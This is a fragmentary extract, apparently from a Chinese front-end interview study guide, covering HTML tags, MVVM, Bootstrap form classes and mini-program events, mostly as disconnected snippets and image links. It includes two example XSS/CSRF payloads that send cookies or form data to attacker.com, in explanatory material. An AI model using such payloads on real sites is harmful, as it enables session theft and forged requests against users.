...
### 39 title与h1的区别、b与strong的区别、i与em的区别
...
const maliciousScript = `
  const xhr = new XMLHttpRequest();  xhr.open('GET', 'http://attacker.com/steal-cookie?cookie=' + document.cookie, true);  xhr.send();
`;
...
// payload.js
const maliciousScript = `
  const form = document.getElementById('transfer-form');  form.action = 'http://attacker.com/steal-data';  form.submit();
`;
...
let template = `
  <h1>My Profile</h1>  <p>Name: ${data.name}</p>  <p>Age: ${data.age}</p>
`;
...
> [http://blog.poetries.top/2018/10/21/fe-interview-hybrid/(opens new window)](http://blog.poetries.top/2018/10/21/fe-interview-hybrid/)
...
> [http://blog.poetries.top/2018/10/21/fe-interview-component/(opens new window)](http://blog.poetries.top/2018/10/21/fe-interview-component/)

### 87 前端面试之MVVM浅析

> [http://blog.poetries.top/2018/10/21/fe-interview-mvvm/(opens new window)](http://blog.poetries.top/2018/10/21/fe-interview-mvvm/)
...
![](https://s.poetries.top/gitee/2020/09/101.png)
...
![](https://s.poetries.top/gitee/2020/07/7.png) ![](https://s.poetries.top/gitee/2020/07/8.png) ![](https://s.poetries.top/gitee/2020/07/9.png) ![](https://s.poetries.top/gitee/2020/07/10.png) ![](https://s.poetries.top/gitee/2020/07/11.png) ![](https://s.poetries.top/gitee/2020/07/12.png) ![](https://s.poetries.top/gitee/2020/07/13.png) ![](https://s.poetries.top/gitee/2020/07/14.png) ![](https://s.poetries.top/gitee/2020/07/15.png) ![](https://s.poetries.top/gitee/2020/07/16.png)
...
2. 使用 `.small` 类：给标题元素添加一个 `.small` 的类，然后在 CSS 中定义该类的样式。示例代码如下：
...
2. 将每个表单项（标签和控件）放置在一个带有 `class="form-group"` 的 `<div>` 元素中，这样可以获得最佳的间距和样式。
...
3. 将文本输入框 `<input>`、文本域 `<textarea>` 和下拉菜单 `<select>` 元素添加 `class="form-control"` 类，以应用 Bootstrap 提供的样式和布局。
...
2. 将每个表单项（标签和控件）放置在一个带有 `class="form-group"` 的 `<div>` 元素中，以获得最佳的间距和样式。
...
3. 在标签元素中添加 `class="control-label"` 类，以标识其为表单项的标签。
...
2. 在帮助文本的标签（通常是 `<span>` 或 `<p>`）中添加 `class="help-block"`。
...
2. 使用自定义属性：在小程序中可以给 HTML 元素添加自定义属性，然后在事件处理函数中通过 `event.currentTarget.dataset` 或 `event.currentTarget.id` 来获取这些属性值。
...
![](https://s.poetries.top/uploads/2022/08/c063c8220d48ed24.png)
...
![](https://s.poetries.top/uploads/2023/02/a666619562c89427.png)
